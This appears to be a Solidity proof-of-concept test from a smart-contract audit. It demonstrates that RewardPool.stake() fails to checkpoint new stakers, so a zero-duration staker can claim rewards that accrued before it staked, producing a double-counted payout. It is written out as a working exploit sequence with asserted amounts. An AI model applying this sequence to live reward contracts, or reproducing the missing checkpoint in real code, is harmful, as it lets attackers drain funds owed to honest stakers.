// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../src/RewardPool.sol";
import "../src/IERC20.sol";
import "./Helpers.sol";

/// @notice A staker account that calls the pool on its own behalf (msg.sender == this actor).
contract Staker {
    function approve(MockERC20 t, address spender, uint256 a) external { t.approve(spender, a); }
    function stake(RewardPool p, uint256 a) external { p.stake(a); }
    function claim(RewardPool p) external { p.claim(); }
}

contract RewardPoolTest {
    IVm constant vm = IVm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    // Issue 1: stake() does not checkpoint the staker, so a fresh staker is credited
    // with rewardPerTokenStored that accrued before it ever staked.
    function test_freshStakerStealsPastRewards() external {
        MockERC20 stakeTok = new MockERC20("STK");
        MockERC20 rewardTok = new MockERC20("RWD");
        RewardPool pool = new RewardPool(stakeTok, rewardTok);

        // Fund the pool with reward tokens so claims can pay out.
        rewardTok.mint(address(pool), 1_000);

        pool.setRewardRate(1); // 1 reward unit per second for the whole pool

        Staker alice = new Staker();
        Staker bob = new Staker();

        // Alice stakes 100 at t0.
        stakeTok.mint(address(alice), 100);
        alice.approve(stakeTok, address(pool), 100);
        alice.stake(pool, 100);

        // 100 seconds pass: the pool accrues 100 reward units, all earned by Alice.
        vm.warp(block.timestamp + 100);

        uint256 aliceEarnedBefore = pool.earned(address(alice));
        uint256 rptBefore = pool.rewardPerToken(); // reward-per-token accrued so far

        // Bob stakes 100 now. stake() only checkpoints the POOL, not Bob,
        // so Bob.userRewardPerTokenPaid stays 0.
        stakeTok.mint(address(bob), 100);
        bob.approve(stakeTok, address(pool), 100);
        bob.stake(pool, 100);

        // Bob has staked for ZERO seconds, yet is already credited rewards.
        uint256 bobEarnedImmediately = pool.earned(address(bob));

        // Bob claims immediately (no additional time elapsed in the same timestamp).
        uint256 bobBalBefore = rewardTok.balanceOf(address(bob));
        bob.claim(pool);
        uint256 bobGot = rewardTok.balanceOf(address(bob)) - bobBalBefore;

        // IMPACT: a fresh staker who provided liquidity for 0 seconds walks away
        // with rewards that accrued entirely before it staked.
        require(bobEarnedImmediately > 0, "no phantom credit");
        require(bobGot == bobEarnedImmediately, "claim mismatch");
        // Quantify: Bob received the full pre-existing reward-per-token on his stake.
        require(bobGot == 100 * rptBefore / 1e18, "unexpected phantom amount");
        require(bobGot == 100, "expected 100 phantom reward units");
        // Alice's accounting is unaffected / she is still owed hers too (double spend).
        require(aliceEarnedBefore == 100, "alice baseline");
        // Pool only ever accrued 100 reward units, but Alice (100) + Bob (100) are both owed 100.
    }
}
